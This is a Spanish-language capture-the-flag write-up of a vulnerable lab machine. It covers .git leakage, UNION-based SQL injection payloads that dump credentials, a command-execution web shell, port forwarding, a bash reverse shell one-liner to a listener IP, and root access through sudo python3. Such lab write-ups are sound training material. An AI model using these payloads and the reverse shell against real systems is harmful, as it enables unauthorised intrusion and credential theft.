## Escaneo de red: 
![[Pasted image 20240208114452.png]]
comenzamos haciendo un arp-scan y un nmap -sn para poder enumerar la red y poder reconocer cual es la ip de la maquina. 
## Enumeración de puertos: 
![[Pasted image 20240208120326.png]]
hacemos primero el reconocimiento de todos los puertos posibles para ver si hay algún puerto abierto, por lo que vemos en la imagen, encontramos el puerto 22 y 80 abiertos, ahora haremos el escaneo de servicios y versiones, además de mandar script de reconocimientos más ocupados 
![[Pasted image 20240208123327.png]]
podemos ver que en el puerto 22 esta el servicio ssh, en el puerto 80 tenemos un servicio http, en el cual tiene una direccion /.git por lo que se puede llegar a ver los ultimos commits.
![[Pasted image 20240208130607.png]]
enumeración de los contenidos de la pagina podemos ver que hay distintos tipos de url, además podemos investigar por tipos de archivos: 
![[Pasted image 20240208155327.png]]
En la investigación del contenido dentro de la pagina solo encontramos que está a la vista el login.php por lo que si entramos dentro de este podemos intentar hacer un sql injecction: 
![[Pasted image 20240208155750.png]]
al presionar login no aparece ni siquiera un tipo de error por lo que podemos deducir que no funciona este tipo de inyecciones: 
si volvemos al archivo targeted de la enumeración de los puertos podemos ver que hay a la vista un archivo .git que si vamos a la url podemos llegar a lo siguiente: 
![[Pasted image 20240208160009.png]]
le hacemos un wget -r a la url que tenemos arriba, es decir escribimos lo siguiente: `wget -r 192.168.1.81/.git` el -r es para que se descarguen los contenidos de la carpeta de manera recursiva.
![[Pasted image 20240208160538.png]]
empezamos a inspeccionar pero no es encuentra nada, pero tenemos un comando que se llama ``git log`` por el cual podemos ver las versiones anteriores del proyecto: 
![[Pasted image 20240208162846.png]]
si vemos el segundo commit implementando un git show y el id del commit y podemos ver lo siguiente:
![[Pasted image 20240208163034.png]]
podemos ver que el email ocupado es "lush@admin.com" y la contraseña es "321".
una vez dentro podemos ver lo siguiente: 
![[Pasted image 20240208163239.png]]
una vez dentro de la pagina podemos intentar ver que tipo de peticiones se hacen con el editar nombre: 
si tomamos la url de la pagina con burpsuite e intentamos hacer una sql injecction a partir de la url entonces queda algo asi: 
![[Pasted image 20240209124952.png]]
podemos ver que no se cae la pagina por lo que podemos saber que tiene 6 columnas.
podemos hacer un union select para empezar a enumerar elementos de la base de datos.
![[Pasted image 20240209130156.png]]
con esto podemos ver que base de datos se esta utilizando dentro de la pagina: 
![[Pasted image 20240209130744.png]]
en este caso se esta utilizando la base de datos darkhole_2, pero hay que suponer que esta no es la unica base de datos que esta dentro de la maquina por lo que podríamos enumerar todas las bases de datos.
```
/dashboard.php?id=2'+union+select+1,2,schema_name,4,5,6+from+information_schema.schema.ta--+-HTTP/1.1
```
![[Pasted image 20240209131802.png]]
podemos ver una base de datos mysql, pero al no ver la base de datos ya mostrada anteriormente para verlas todas tenemos que utilizas un group concat de la siguiente forma: 
```
/dashboard.php?id=2'+union+select+1,2,group_concat(schema_name),4,5,6+from+information_schema.schemata--+-
```
![[Pasted image 20240209131937.png]]
![[Pasted image 20240209132153.png]]
esa es la respuesta que necesitamos , en la cual podemos ver, `mysql,information_schema,performance_schema,sys,darkhole_2`, por lo que podemos decir que solo nos interesa la base de datos de la pagina, es decir darkhole_2: 
```
/dashboard.php?id=2'+union+select+1,2,group_concat(table_name),4,5,6+from+information_schema.tables+where+table_schema%3d'darkhole_2'--+-
Respuesta: ssh,users
```
podemos ver que dentro de la base de datos podemos ver las tablas ssh y users, si intentamos enumerar las columnas que tiene tabla ssh podemos ver las columnas: 
```
/dashboard.php?id=2'+union+select+1,2,group_concat(column_name),4,5,6+from+information_schema.columns+where+table_schema%3d'darkhole_2'+and+table_name%3d'ssh'--+- 
Respuesta: id,user,pass
```
![[Pasted image 20240209134156.png]]
una vez que tenemos esto podemos empezar a enumerar los datos, haciendo la siguiente query: 
```
/dashboard.php?id=2'+union+select+1,2,group_concat(user,0x3a,pass),4,5,6+from+ssh--+-
Respuesta: jehad:fool
```
![[Pasted image 20240209135048.png]]
ahora intentamos entrar con el usuario y contraseña encontrado a través de ssh y veremos lo siguiente: 
![[Pasted image 20240209141354.png]]
si vemos el historico de la terminal en el archivo .bash_history podemos  ver lo siguiente: ![[Pasted image 20240209141918.png]]
esto llama la atencion ya que esto pareciera ser que hay un potencial de hacer un RCE, y poder ejecutar un reverse shell:
![[Pasted image 20240209142120.png]]
con el comando netstat -nat podemos ver que puertos estan siendo oscupados dentro de la maquina, dentro de los cuales estan 33060,3306,9999 lo cual es importante para este punto, ya que podemos ver que se ocupa centro del historico: 
![[Pasted image 20240209142717.png]]
si hacemos un ps faux | grep "9999" podremos ver que hay un directorio /opt/web donde hay montado un servidor http, también podemos ver que estos archivos están siendo ejecutados por el usuario ``losy``, por lo que a lo mejor se podría sacar partido de esto.
![[Pasted image 20240209143007.png]]
si hacemos un cat al index.php podríamos ver que se declara un parámetro cmd por el cual se pueden ejecutar comando de consola dentro de la web. 
![[Pasted image 20240209143408.png]]
si hacemos un  `curl -s -X GET http://localhost:9999/?cmd=whoami` o un comando cualquiera de la termial podemos ver que nos responde von un parameter get ['cmd'] y la respuesta de este.

podemos dejar expuesto el puerto 9999 a través de una herramienta llamada chisel, primero tenemos que ejecutar chisel como servidor en nuestra  maquina,
![[Pasted image 20240209161853.png]]
luego tenemos que ejecutar como cliente en la maquina atacada.
![[Pasted image 20240209164609.png]]
en este caso podemos ver que ejecutamos como cliente al puerto que abrimos en el servidor, y ponemos el puerto 9999 a localhost 9999.
![[Pasted image 20240209164732.png]]
si nos metemos en el localhost:9999 podemos ver lo que esta dentro del 9999 de la maquina atacada. 
el remote portforwarding  se puede hacer desde el ssh, pero en ese caso tendría que ser local portforwarding ya que se hace desde el servicio local: 
```
$ ssh jehad@<ip> L:9999:127.0.0.1:9999
```
con el comando ``lsb_release -a`` podemos ver informacion del sistema operativo.
podemos ver que es un ubuntu focal: 
![[Pasted image 20240212115217.png]]
hacemos un oneliner para poder tomar control de una consola interactiva que es: `bash -c "bash -i >& /dev/tcp/192.168.1.89/443 0>&1"`
![[Pasted image 20240212115834.png]]

nos ponemos en escucha en nuestra terminal con netcat de la siguiente forma: 
```
$ nc -nlvp 443
```
![[Pasted image 20240212115822.png]]
podemos ver la primera flag que esta en el directorio home de losy.
![[Pasted image 20240212121157.png]]
si hacemos un cat al -bash_history podemos ver que alguien ha intentado hacer cosas con la contraseña de losy, por lo que la contraseña de losy es gang ahora la probaremos para ver si realmente esa es, para hacer esto podemos hacer un sudo -l para ver si tenemos permisos de root: 
![[Pasted image 20240212121357.png]]
podemos ver que tenemos el binario de python3 como usuario privilegiado, tambien podemos hacer un `find / -perm -4000 2>/dev/null` para ver si hay algun otro binario con privilegios de suid:
![[Pasted image 20240212121609.png]]
por lo cual podemos ver que esta pkexec, el cual **queda de tarea explotarlo despues para aprender**.
pero ahora podemos hacer `sudo -u root python3` para tener una consola interactiva dentron de la maquina, 
![[Pasted image 20240212122025.png]]
ahora podemos importar la librería os y poder ejecutar comandos : 
![[Pasted image 20240212122207.png]]
si hacemos un os.system("bash"), nos entregara una consola con privilegios de root, por lo que podemos ir al directorio root y sacar la ultima flag: 
![[Pasted image 20240212122321.png]]
